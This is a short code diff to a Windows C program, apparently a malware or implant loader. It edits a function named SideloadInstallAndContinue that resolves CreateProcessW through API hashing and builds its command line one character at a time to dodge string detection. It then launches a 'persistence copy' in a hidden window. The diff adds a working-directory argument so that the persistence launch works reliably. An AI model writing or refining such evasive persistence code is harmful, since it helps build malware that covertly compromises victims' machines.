@@ -505,10 +505,13 @@ VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
         wCmdLine[ci++] = L' '; wCmdLine[ci++] = L'/';
         wCmdLine[ci++] = L'p'; wCmdLine[ci++] = L'f';
         wCmdLine[ci]   = 0;
+        WCHAR wDestDirW[MAX_PATH] = {0};
+        for (SIZE_T i = 0; szDestDir[i] && i < MAX_PATH-1; i++)
+            wDestDirW[i] = (WCHAR)(UCHAR)szDestDir[i];
         STARTUPINFOW si = {0}; si.cb = sizeof(si);
         si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
         PROCESS_INFORMATION pi = {0};
-        pCrProcW(NULL, wCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+        pCrProcW(NULL, wCmdLine, NULL, NULL, FALSE, 0, NULL, wDestDirW, &si, &pi);
         LOG("[+] SideloadInstall: launched persistence copy /pf");
     }
 #endif
